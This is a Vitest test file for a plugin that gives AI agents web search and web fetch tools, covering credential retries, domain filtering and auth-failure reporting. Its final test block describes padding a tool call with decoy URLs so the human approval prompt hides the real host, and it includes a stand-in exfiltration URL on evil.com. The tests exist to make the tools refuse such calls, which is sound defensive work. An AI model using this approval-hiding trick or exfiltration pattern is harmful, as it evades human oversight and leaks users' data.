// @vitest-environment node
import { describe, it, expect, vi, beforeEach } from "vitest";

vi.mock("./brave-search", () => ({
  braveSearch: vi.fn(),
}));

vi.mock("./web-fetch", () => ({
  webFetch: vi.fn(),
}));

import { braveSearch } from "./brave-search.js";
import { webFetch } from "./web-fetch.js";
import plugin from "./index.js";

const braveSearchMock = braveSearch as ReturnType<typeof vi.fn>;
const webFetchMock = webFetch as ReturnType<typeof vi.fn>;

interface ToolFactory {
  (ctx: { agentId?: string }): {
    name: string;
    label: string;
    description: string;
    parameters: Record<string, unknown>;
    execute: (
      toolCallId: string,
      params: Record<string, unknown>,
      signal?: AbortSignal
    ) => Promise<{
      content: { type: string; text: string }[];
      isError?: boolean;
      details?: unknown;
    }>;
  } | null;
}

function collectFactories(pluginConfig?: Record<string, unknown>) {
  const factories: Record<string, ToolFactory> = {};
  const api = {
    pluginConfig,
    registerTool(factory: ToolFactory, opts?: { name?: string }) {
      if (opts?.name) {
        factories[opts.name] = factory;
      }
    },
  };
  plugin.register(api);
  return factories;
}

/**
 * Plugin config that exercises the Pattern B credentials flow (see #209).
 * Pinchy writes connectionId + bootstrap creds into the plugin config; the
 * plugin fetches the per-tenant Brave apiKey from the Pinchy API on demand.
 */
function credentialsPluginConfig(agents: Record<string, unknown>) {
  return {
    apiBaseUrl: "https://pinchy.test",
    gatewayToken: "gw-token",
    connectionId: "conn-1",
    agents,
  };
}

function stubCredentialsFetch(apiKey: string) {
  const fetchMock = vi.fn(async (_input: string | URL, _init?: RequestInit) => ({
    ok: true,
    status: 200,
    statusText: "OK",
    json: async () => ({ credentials: { apiKey } }),
  }));
  vi.stubGlobal("fetch", fetchMock);
  return fetchMock;
}

describe("pinchy-web plugin", () => {
  beforeEach(() => {
    vi.resetAllMocks();
    vi.unstubAllGlobals();
  });

  it("has correct plugin metadata", () => {
    expect(plugin.id).toBe("pinchy-web");
    expect(plugin.name).toBe("Pinchy Web");
    expect(plugin.description).toBeTruthy();
  });

  it("registers both tool factories", () => {
    const factories = collectFactories({
      braveApiKey: "test-key",
      agents: {},
    });

    expect(factories).toHaveProperty("pinchy_web_search");
    expect(factories).toHaveProperty("pinchy_web_fetch");
  });

  describe("tool factory returns null when agent has no config", () => {
    it("returns null for pinchy_web_search when agent is not configured", () => {
      const factories = collectFactories({
        braveApiKey: "test-key",
        agents: {},
      });

      const tool = factories.pinchy_web_search({ agentId: "unknown-agent" });
      expect(tool).toBeNull();
    });

    it("returns null for pinchy_web_fetch when agent is not configured", () => {
      const factories = collectFactories({
        braveApiKey: "test-key",
        agents: {},
      });

      const tool = factories.pinchy_web_fetch({ agentId: "unknown-agent" });
      expect(tool).toBeNull();
    });

    it("returns null when agentId is undefined", () => {
      const factories = collectFactories({
        braveApiKey: "test-key",
        agents: { "agent-1": { tools: ["pinchy_web_search"] } },
      });

      expect(factories.pinchy_web_search({ agentId: undefined })).toBeNull();
      expect(factories.pinchy_web_fetch({ agentId: undefined })).toBeNull();
    });
  });

  describe("pinchy_web_search tool factory", () => {
    it("returns tool when agent has pinchy_web_search in tools", () => {
      const factories = collectFactories({
        braveApiKey: "test-key",
        agents: { "agent-1": { tools: ["pinchy_web_search"] } },
      });

      const tool = factories.pinchy_web_search({ agentId: "agent-1" });
      expect(tool).not.toBeNull();
      expect(tool!.name).toBe("pinchy_web_search");
      expect(tool!.label).toBeTruthy();
      expect(tool!.description).toBeTruthy();
      expect(tool!.parameters).toBeTruthy();
    });

    it("returns null when agent does not have pinchy_web_search in tools", () => {
      const factories = collectFactories({
        braveApiKey: "test-key",
        agents: { "agent-1": { tools: ["pinchy_web_fetch"] } },
      });

      const tool = factories.pinchy_web_search({ agentId: "agent-1" });
      expect(tool).toBeNull();
    });
  });

  describe("pinchy_web_fetch tool factory", () => {
    it("returns tool when agent has pinchy_web_fetch in tools", () => {
      const factories = collectFactories({
        braveApiKey: "test-key",
        agents: { "agent-1": { tools: ["pinchy_web_fetch"] } },
      });

      const tool = factories.pinchy_web_fetch({ agentId: "agent-1" });
      expect(tool).not.toBeNull();
      expect(tool!.name).toBe("pinchy_web_fetch");
      expect(tool!.label).toBeTruthy();
      expect(tool!.description).toBeTruthy();
      expect(tool!.parameters).toBeTruthy();
    });

    it("returns null when agent does not have pinchy_web_fetch in tools", () => {
      const factories = collectFactories({
        braveApiKey: "test-key",
        agents: { "agent-1": { tools: ["pinchy_web_search"] } },
      });

      const tool = factories.pinchy_web_fetch({ agentId: "agent-1" });
      expect(tool).toBeNull();
    });
  });

  describe("both tools configured for one agent", () => {
    it("returns both tools when agent has both in tools array", () => {
      const factories = collectFactories({
        braveApiKey: "test-key",
        agents: {
          "agent-1": { tools: ["pinchy_web_search", "pinchy_web_fetch"] },
        },
      });

      const searchTool = factories.pinchy_web_search({ agentId: "agent-1" });
      const fetchTool = factories.pinchy_web_fetch({ agentId: "agent-1" });
      expect(searchTool).not.toBeNull();
      expect(fetchTool).not.toBeNull();
    });
  });

  describe("pinchy_web_search.execute()", () => {
    it("calls braveSearch with correct config and returns results", async () => {
      const mockResults = [
        { title: "Result 1", url: "https://example.com", description: "Desc 1" },
      ];
      braveSearchMock.mockResolvedValue({ results: mockResults });
      stubCredentialsFetch("brave-key-123");

      const factories = collectFactories(
        credentialsPluginConfig({
          "agent-1": {
            tools: ["pinchy_web_search"],
            allowedDomains: ["example.com"],
            language: "en",
            country: "US",
            freshness: "pw",
          },
        })
      );

      const tool = factories.pinchy_web_search({ agentId: "agent-1" })!;
      const result = await tool.execute("call-1", { query: "test query" });

      expect(braveSearchMock).toHaveBeenCalledOnce();
      expect(braveSearchMock).toHaveBeenCalledWith("test query", {
        apiKey: "brave-key-123",
        allowedDomains: ["example.com"],
        excludedDomains: undefined,
        language: "en",
        country: "US",
        freshness: "pw",
      });
      expect(result.isError).toBeUndefined();
      expect(result.content[0].type).toBe("text");
      expect(JSON.parse(result.content[0].text)).toEqual(mockResults);
    });

    it("names the calling agent when fetching the Brave key (#987)", async () => {
      // The web-search connection is instance-wide — every agent's plugin
      // config carries the same connectionId — so the server authorizes on the
      // agent's tool list instead of a permission row. It can only do that if
      // the plugin says which agent it is acting for.
      braveSearchMock.mockResolvedValue({ results: [] });
      const fetchMock = stubCredentialsFetch("brave-key-123");

      const factories = collectFactories(
        credentialsPluginConfig({ "agent-1": { tools: ["pinchy_web_search"] } })
      );
      await factories.pinchy_web_search({ agentId: "agent-1" })!.execute("call-1", {
        query: "test query",
      });

      const url = new URL(String(fetchMock.mock.calls[0][0]));
      expect(url.pathname).toContain("conn-1");
      expect(url.searchParams.get("agentId")).toBe("agent-1");
    });

    it("passes excludedDomains from agent config", async () => {
      braveSearchMock.mockResolvedValue({ results: [] });
      stubCredentialsFetch("brave-key-123");

      const factories = collectFactories(
        credentialsPluginConfig({
          "agent-1": {
            tools: ["pinchy_web_search"],
            excludedDomains: ["reddit.com", "pinterest.com"],
          },
        })
      );

      const tool = factories.pinchy_web_search({ agentId: "agent-1" })!;
      await tool.execute("call-1", { query: "some query" });

      expect(braveSearchMock).toHaveBeenCalledWith(
        "some query",
        expect.objectContaining({
          excludedDomains: ["reddit.com", "pinterest.com"],
        })
      );
    });

    it("returns isError when credentials config is missing", async () => {
      const factories = collectFactories({
        agents: {
          "agent-1": { tools: ["pinchy_web_search"] },
        },
      });

      const tool = factories.pinchy_web_search({ agentId: "agent-1" })!;
      const result = await tool.execute("call-1", { query: "test" });

      expect(result.isError).toBe(true);
      expect(result.content[0].text).toContain("not configured");
      expect(result.content[0].text).toContain("Brave Search API key");
      expect(braveSearchMock).not.toHaveBeenCalled();
      // #404 audit contract: OpenClaw strips isError before forwarding the
      // tool result to /api/internal/audit/tool-use, so details.error is the
      // audit route's only remaining failure signal.
      expect(result.details).toEqual({ error: result.content[0].text });
    });

    it("returns isError when braveSearch throws", async () => {
      braveSearchMock.mockRejectedValue(new Error("API rate limit"));
      stubCredentialsFetch("brave-key-123");

      const factories = collectFactories(
        credentialsPluginConfig({
          "agent-1": { tools: ["pinchy_web_search"] },
        })
      );

      const tool = factories.pinchy_web_search({ agentId: "agent-1" })!;
      const result = await tool.execute("call-1", { query: "test" });

      expect(result.isError).toBe(true);
      expect(result.content[0].text).toContain("Search failed");
      expect(result.content[0].text).toContain("API rate limit");
      expect(result.details).toEqual({ error: result.content[0].text });
    });

    it("surfaces the actionable credentials-endpoint message when the connection was deleted (404)", async () => {
      // The credentials fetch itself 404s (connection removed/replaced — e.g.
      // deleted + re-added). The route body carries an actionable message; the
      // plugin must pass it through, not report a bare "HTTP 404".
      const fetchMock = vi.fn(async () => ({
        ok: false,
        status: 404,
        statusText: "Not Found",
        json: async () => ({
          error:
            "This integration is no longer connected — it may have been removed or replaced. An admin can reconnect it under Settings → Integrations.",
        }),
      }));
      vi.stubGlobal("fetch", fetchMock);

      const factories = collectFactories(
        credentialsPluginConfig({
          "agent-1": { tools: ["pinchy_web_search"] },
        })
      );

      const tool = factories.pinchy_web_search({ agentId: "agent-1" })!;
      const result = await tool.execute("call-1", { query: "test" });

      expect(result.isError).toBe(true);
      expect(result.content[0].text).toMatch(/no longer connected/i);
    });

    it("surfaces a credentials-fetch 401 that outlasts the retries without flagging the connection", async () => {
      // Pinchy's own 401 is about the gateway token, not the Brave key. Even
      // when it never clears, it must not be classified as stale credentials
      // and reported as an auth failure on the connection.
      vi.useFakeTimers();
      const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
      try {
        const fetchMock = vi.fn(async (_url: string | URL, _init?: RequestInit) => ({
          ok: false,
          status: 401,
          statusText: "Unauthorized",
          json: async () => ({ error: "Unauthorized" }),
        }));
        vi.stubGlobal("fetch", fetchMock);

        const factories = collectFactories(
          credentialsPluginConfig({ "agent-1": { tools: ["pinchy_web_search"] } })
        );
        const pending = factories
          .pinchy_web_search({ agentId: "agent-1" })!
          .execute("call-1", { query: "test" });
        await vi.advanceTimersByTimeAsync(250 + 500 + 1000 + 2000);
        const result = await pending;

        expect(result.isError).toBe(true);
        expect(result.content[0].text).toContain("HTTP 401");
        expect(
          fetchMock.mock.calls.filter((c) => String(c[0]).includes("/credentials"))
        ).toHaveLength(5);
        expect(
          fetchMock.mock.calls.filter((c) => String(c[0]).includes("report-auth-failure"))
        ).toHaveLength(0);
        expect(braveSearchMock).not.toHaveBeenCalled();
      } finally {
        vi.useRealTimers();
        warn.mockRestore();
      }
    });

    it("rides out 401s on the credentials fetch right after a config apply, then searches", async () => {
      // Pinchy answers its internal routes 401 while it momentarily cannot
      // read the shared gateway token. One attempt used to fail the whole
      // search with "HTTP 401 Unauthorized" on the Brave credentials.
      vi.useFakeTimers();
      const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
      try {
        braveSearchMock.mockResolvedValue({ results: [] });
        const unauthorized = {
          ok: false,
          status: 401,
          statusText: "Unauthorized",
          json: async () => ({ error: "Unauthorized" }),
        };
        const fetchMock = vi
          .fn()
          .mockResolvedValueOnce(unauthorized)
          .mockResolvedValueOnce(unauthorized)
          .mockResolvedValueOnce({
            ok: true,
            status: 200,
            statusText: "OK",
            json: async () => ({ credentials: { apiKey: "brave-key-123" } }),
          });
        vi.stubGlobal("fetch", fetchMock);

        const factories = collectFactories(
          credentialsPluginConfig({ "agent-1": { tools: ["pinchy_web_search"] } })
        );
        const pending = factories
          .pinchy_web_search({ agentId: "agent-1" })!
          .execute("call-1", { query: "test" });
        await vi.advanceTimersByTimeAsync(250 + 500);
        const result = await pending;

        expect(fetchMock).toHaveBeenCalledTimes(3);
        expect(braveSearchMock).toHaveBeenCalled();
        expect(result.isError).not.toBe(true);
        // Pinchy's own 401 is not Brave rejecting the key: nothing may flag
        // the connection as auth_failed over it.
        expect(
          fetchMock.mock.calls.filter((c) => String(c[0]).includes("report-auth-failure"))
        ).toHaveLength(0);
      } finally {
        vi.useRealTimers();
        warn.mockRestore();
      }
    });

    it("reports a credentials answer that is null as the credentials API's", async () => {
      vi.stubGlobal(
        "fetch",
        vi.fn(async () => ({ ok: true, status: 200, statusText: "OK", json: async () => null }))
      );

      const factories = collectFactories(
        credentialsPluginConfig({
          "agent-1": { tools: ["pinchy_web_search"] },
        })
      );

      const tool = factories.pinchy_web_search({ agentId: "agent-1" })!;
      const result = await tool.execute("call-1", { query: "test" });

      expect(result.isError).toBe(true);
      expect(result.content[0].text).toContain("credentials API answered null, not an object");
    });

    it("aborts a hung credentials fetch via AbortSignal.timeout(10_000) instead of blocking forever", async () => {
      // Simulates a Pinchy container that never answers Pinchy's own internal
      // credentials route (mid-deploy, network blackhole) — the mock only
      // ever settles via the AbortSignal fetchBraveCredentials passes in,
      // exactly like a real hung `fetch` would once the signal fires.
      const timeoutSpy = vi.spyOn(AbortSignal, "timeout").mockImplementation((_ms: number) => {
        const controller = new AbortController();
        setTimeout(
          () => controller.abort(new DOMException("The operation timed out.", "TimeoutError")),
          1
        );
        return controller.signal;
      });
      const fetchMock = vi.fn((_url: string | URL, init?: RequestInit) => {
        return new Promise((_resolve, reject) => {
          const signal = init?.signal;
          signal?.addEventListener("abort", () => {
            reject(signal.reason ?? new Error("The operation was aborted"));
          });
        });
      });
      vi.stubGlobal("fetch", fetchMock);

      const factories = collectFactories(
        credentialsPluginConfig({
          "agent-1": { tools: ["pinchy_web_search"] },
        })
      );

      const tool = factories.pinchy_web_search({ agentId: "agent-1" })!;
      const result = await tool.execute("call-1", { query: "test" });

      expect(result.isError).toBe(true);
      expect(timeoutSpy).toHaveBeenCalledWith(10_000);
      timeoutSpy.mockRestore();
    });

    it("POSTs report-auth-failure when retry-once also returns a 401 from Brave", async () => {
      braveSearchMock
        .mockRejectedValueOnce(new Error("401 Unauthorized"))
        .mockRejectedValueOnce(new Error("401 Unauthorized"));

      const fetchMock = vi.fn(async (_input: string | URL, _init?: RequestInit) => ({
        ok: true,
        status: 200,
        statusText: "OK",
        json: async () => ({ credentials: { apiKey: "brave-key-123" } }),
      }));
      vi.stubGlobal("fetch", fetchMock);

      const factories = collectFactories(
        credentialsPluginConfig({
          "agent-1": { tools: ["pinchy_web_search"] },
        })
      );

      const tool = factories.pinchy_web_search({ agentId: "agent-1" })!;
      await tool.execute("call-1", { query: "test" });

      const reportCalls = fetchMock.mock.calls.filter((c) =>
        String(c[0]).includes("report-auth-failure")
      );
      expect(reportCalls).toHaveLength(1);
      const [url, opts] = reportCalls[0] as [string, RequestInit];
      expect(url).toBe("https://pinchy.test/api/internal/integrations/conn-1/report-auth-failure");
      expect(opts.method).toBe("POST");
      const headers = opts.headers as Record<string, string>;
      expect(headers["Authorization"]).toBe("Bearer gw-token");
      expect(headers["X-Plugin-Id"]).toBe("pinchy-web");
      const body = JSON.parse(opts.body as string) as { reason: string };
      expect(body.reason).toBeTruthy();
    });

    it("classifies a Brave 401 by its status, not by its body (#1077)", async () => {
      // Brave's 401 body is `{"code":"SUBSCRIPTION_TOKEN_INVALID"}` — it
      // carries no auth word at all, so once the bare "401" substring match
      // was dropped, the status on BraveSearchError is the only thing left
      // that can recognise a stale key. If this goes red, the narrowed
      // classifier cost us the real case it exists for.
      const braveError = Object.assign(
        new Error('Brave Search API error (401): {"code":"SUBSCRIPTION_TOKEN_INVALID"}'),
        { status: 401 }
      );
      braveSearchMock.mockRejectedValueOnce(braveError).mockRejectedValueOnce(braveError);

      const fetchMock = stubCredentialsFetch("brave-key-123");
      const factories = collectFactories(
        credentialsPluginConfig({ "agent-1": { tools: ["pinchy_web_search"] } })
      );

      await factories.pinchy_web_search({ agentId: "agent-1" })!.execute("call-1", {
        query: "test",
      });

      expect(
        fetchMock.mock.calls.filter((c) => String(c[0]).includes("report-auth-failure"))
      ).toHaveLength(1);
    });

    it("does not flag the connection when a non-401 body merely contains 401 (#1077)", async () => {
      braveSearchMock.mockRejectedValue(
        Object.assign(
          new Error('Brave Search API error (429): {"detail":"quota 401 of 500 used"}'),
          { status: 429 }
        )
      );

      const fetchMock = stubCredentialsFetch("brave-key-123");
      const factories = collectFactories(
        credentialsPluginConfig({ "agent-1": { tools: ["pinchy_web_search"] } })
      );

      await factories.pinchy_web_search({ agentId: "agent-1" })!.execute("call-1", {
        query: "test",
      });

      expect(braveSearchMock).toHaveBeenCalledTimes(1);
      expect(
        fetchMock.mock.calls.filter((c) => String(c[0]).includes("report-auth-failure"))
      ).toHaveLength(0);
    });

    it("does not POST report-auth-failure when the retry with a fresh key fails for another reason", async () => {
      // The refetched key is fine; the retry then hits a Brave outage. Only an
      // auth error says the key is bad — anything else would flip a healthy
      // connection to auth_failed with nothing to clear it.
      braveSearchMock
        .mockRejectedValueOnce(new Error("401 Unauthorized"))
        .mockRejectedValueOnce(
          Object.assign(new Error("Brave Search API error (502): Bad Gateway"), { status: 502 })
        );

      const fetchMock = stubCredentialsFetch("brave-key-123");
      const factories = collectFactories(
        credentialsPluginConfig({ "agent-1": { tools: ["pinchy_web_search"] } })
      );

      const result = await factories.pinchy_web_search({ agentId: "agent-1" })!.execute("call-1", {
        query: "test",
      });

      expect(result.isError).toBe(true);
      expect(braveSearchMock).toHaveBeenCalledTimes(2);
      expect(
        fetchMock.mock.calls.filter((c) => String(c[0]).includes("report-auth-failure"))
      ).toHaveLength(0);
    });

    it("does not POST report-auth-failure on a transient 5xx error from Brave", async () => {
      braveSearchMock.mockRejectedValueOnce(new Error("503 Service Unavailable"));

      const fetchMock = stubCredentialsFetch("brave-key-123");

      const factories = collectFactories(
        credentialsPluginConfig({
          "agent-1": { tools: ["pinchy_web_search"] },
        })
      );

      const tool = factories.pinchy_web_search({ agentId: "agent-1" })!;
      await tool.execute("call-1", { query: "test" });

      const reportCalls = fetchMock.mock.calls.filter((c) =>
        String(c[0]).includes("report-auth-failure")
      );
      expect(reportCalls).toHaveLength(0);
    });

    it("appends a note to the tool result when results were filtered by domain", async () => {
      const mockResults = [
        { title: "Result 1", url: "https://github.com/1", description: "Desc 1" },
      ];
      braveSearchMock.mockResolvedValue({ results: mockResults, filteredCount: 2 });
      stubCredentialsFetch("brave-key-123");

      const factories = collectFactories(
        credentialsPluginConfig({
          "agent-1": { tools: ["pinchy_web_search"], allowedDomains: ["github.com"] },
        })
      );

      const tool = factories.pinchy_web_search({ agentId: "agent-1" })!;
      const result = await tool.execute("call-1", { query: "test query" });

      expect(result.isError).toBeUndefined();
      expect(result.content[0].text).toContain(
        "(2 results were filtered out by this agent's domain restrictions.)"
      );
    });

    it("uses singular agreement in the note when exactly one result was filtered", async () => {
      // The note is prose the model reads back to the user. "1 result … were
      // filtered out" is the shape a `${n === 1 ? "" : "s"}` suffix leaves
      // behind when the verb is not pluralised alongside the noun.
      braveSearchMock.mockResolvedValue({
        results: [{ title: "Result 1", url: "https://github.com/1", description: "Desc 1" }],
        filteredCount: 1,
      });
      stubCredentialsFetch("brave-key-123");

      const factories = collectFactories(
        credentialsPluginConfig({
          "agent-1": { tools: ["pinchy_web_search"], allowedDomains: ["github.com"] },
        })
      );

      const tool = factories.pinchy_web_search({ agentId: "agent-1" })!;
      const result = await tool.execute("call-1", { query: "test query" });

      expect(result.content[0].text).toContain(
        "(1 result was filtered out by this agent's domain restrictions.)"
      );
    });

    it("names the restriction rather than the allow-list, so an exclude-only agent reads true prose", async () => {
      // An agent configured with only an exclude list has no allowed domains
      // to be "outside" of — the earlier wording asserted a config that does
      // not exist.
      braveSearchMock.mockResolvedValue({
        results: [{ title: "Result 1", url: "https://example.com/1", description: "Desc 1" }],
        filteredCount: 3,
      });
      stubCredentialsFetch("brave-key-123");

      const factories = collectFactories(
        credentialsPluginConfig({
          "agent-1": { tools: ["pinchy_web_search"], excludedDomains: ["reddit.com"] },
        })
      );

      const tool = factories.pinchy_web_search({ agentId: "agent-1" })!;
      const result = await tool.execute("call-1", { query: "test query" });

      expect(result.content[0].text).not.toContain("allowed domains");
      expect(result.content[0].text).toContain("domain restrictions");
    });

    it("does not append a filtering note when nothing was filtered", async () => {
      const mockResults = [
        { title: "Result 1", url: "https://example.com", description: "Desc 1" },
      ];
      braveSearchMock.mockResolvedValue({ results: mockResults });
      stubCredentialsFetch("brave-key-123");

      const factories = collectFactories(
        credentialsPluginConfig({
          "agent-1": { tools: ["pinchy_web_search"] },
        })
      );

      const tool = factories.pinchy_web_search({ agentId: "agent-1" })!;
      const result = await tool.execute("call-1", { query: "test query" });

      expect(result.content[0].text).not.toContain("filtered");
      expect(JSON.parse(result.content[0].text)).toEqual(mockResults);
    });

    it("handles non-Error throws from braveSearch", async () => {
      braveSearchMock.mockRejectedValue("string error");
      stubCredentialsFetch("brave-key-123");

      const factories = collectFactories(
        credentialsPluginConfig({
          "agent-1": { tools: ["pinchy_web_search"] },
        })
      );

      const tool = factories.pinchy_web_search({ agentId: "agent-1" })!;
      const result = await tool.execute("call-1", { query: "test" });

      expect(result.isError).toBe(true);
      expect(result.content[0].text).toContain("string error");
    });
  });

  describe("pinchy_web_fetch.execute()", () => {
    it("calls webFetch with correct config and returns content", async () => {
      webFetchMock.mockResolvedValue({ content: "Page content here" });

      const factories = collectFactories({
        braveApiKey: "key",
        agents: {
          "agent-1": {
            tools: ["pinchy_web_fetch"],
            allowedDomains: ["docs.example.com"],
            excludedDomains: ["evil.com"],
          },
        },
      });

      const tool = factories.pinchy_web_fetch({ agentId: "agent-1" })!;
      const result = await tool.execute("call-1", { url: "https://docs.example.com/page" });

      expect(webFetchMock).toHaveBeenCalledOnce();
      expect(webFetchMock).toHaveBeenCalledWith("https://docs.example.com/page", {
        allowedDomains: ["docs.example.com"],
        excludedDomains: ["evil.com"],
      });
      expect(result.isError).toBeUndefined();
      expect(result.content[0].type).toBe("text");
      expect(result.content[0].text).toBe("Page content here");
    });

    it("passes through isError from webFetch result", async () => {
      webFetchMock.mockResolvedValue({
        content: "Domain blocked for this agent.",
        isError: true,
      });

      const factories = collectFactories({
        braveApiKey: "key",
        agents: {
          "agent-1": { tools: ["pinchy_web_fetch"] },
        },
      });

      const tool = factories.pinchy_web_fetch({ agentId: "agent-1" })!;
      const result = await tool.execute("call-1", { url: "https://evil.com" });

      expect(result.isError).toBe(true);
      expect(result.content[0].text).toBe("Domain blocked for this agent.");
      // #404 audit contract: OpenClaw strips isError before forwarding the
      // tool result to /api/internal/audit/tool-use, so details.error is the
      // audit route's only remaining failure signal.
      expect(result.details).toEqual({ error: "Domain blocked for this agent." });
    });

    it("returns isError when webFetch throws", async () => {
      webFetchMock.mockRejectedValue(new Error("Network timeout"));

      const factories = collectFactories({
        braveApiKey: "key",
        agents: {
          "agent-1": { tools: ["pinchy_web_fetch"] },
        },
      });

      const tool = factories.pinchy_web_fetch({ agentId: "agent-1" })!;
      const result = await tool.execute("call-1", { url: "https://example.com" });

      expect(result.isError).toBe(true);
      expect(result.content[0].text).toContain("Fetch failed");
      expect(result.content[0].text).toContain("Network timeout");
      expect(result.details).toEqual({ error: result.content[0].text });
    });

    it("handles non-Error throws from webFetch", async () => {
      webFetchMock.mockRejectedValue("unexpected failure");

      const factories = collectFactories({
        braveApiKey: "key",
        agents: {
          "agent-1": { tools: ["pinchy_web_fetch"] },
        },
      });

      const tool = factories.pinchy_web_fetch({ agentId: "agent-1" })!;
      const result = await tool.execute("call-1", { url: "https://example.com" });

      expect(result.isError).toBe(true);
      expect(result.content[0].text).toContain("unexpected failure");
    });

    it("does not require braveApiKey for web fetch", async () => {
      webFetchMock.mockResolvedValue({ content: "Fetched content" });

      const factories = collectFactories({
        // No braveApiKey
        agents: {
          "agent-1": { tools: ["pinchy_web_fetch"] },
        },
      });

      const tool = factories.pinchy_web_fetch({ agentId: "agent-1" })!;
      const result = await tool.execute("call-1", { url: "https://example.com" });

      expect(result.isError).toBeUndefined();
      expect(result.content[0].text).toBe("Fetched content");
    });
  });

  // Every tool can be gated, and a key the tool never reads is still shown to
  // the person approving the call: URLs under `target`, `destination` and
  // `targets` ahead of the one `url` the fetch reads take the room the
  // approval prompt has for naming hosts. So neither tool runs with one.
  describe("undeclared parameters", () => {
    const decoys = {
      target: `https://${"a".repeat(120)}.firma.at/`,
      destination: "https://b.firma.at/",
      targets: ["https://s1.firma.at/", "https://s2.firma.at/"],
      url: "https://evil.com/exfil?d=secret",
    };
    const config = {
      braveApiKey: "key",
      agents: { "agent-1": { tools: ["pinchy_web_fetch", "pinchy_web_search"] } },
    };

    it.each(["pinchy_web_fetch", "pinchy_web_search"])(
      "%s declares additionalProperties: false",
      (name) => {
        const tool = collectFactories(config)[name]({ agentId: "agent-1" })!;
        expect(tool.parameters.additionalProperties).toBe(false);
      }
    );

    it("pinchy_web_fetch refuses a call with decoy URLs and fetches nothing", async () => {
      const tool = collectFactories(config).pinchy_web_fetch({ agentId: "agent-1" })!;
      const result = await tool.execute("call-1", decoys);
      expect(result.isError).toBe(true);
      expect(result.content[0].text).toMatch(/does not take the parameters "target"/);
      expect(webFetchMock).not.toHaveBeenCalled();
    });

    it("pinchy_web_search refuses a call with a key it does not declare", async () => {
      const tool = collectFactories(config).pinchy_web_search({ agentId: "agent-1" })!;
      const result = await tool.execute("call-1", { query: "acme", url: "https://evil.com/" });
      expect(result.isError).toBe(true);
      expect(result.content[0].text).toMatch(/does not take the parameter "url"/);
      expect(braveSearchMock).not.toHaveBeenCalled();
    });
  });
});
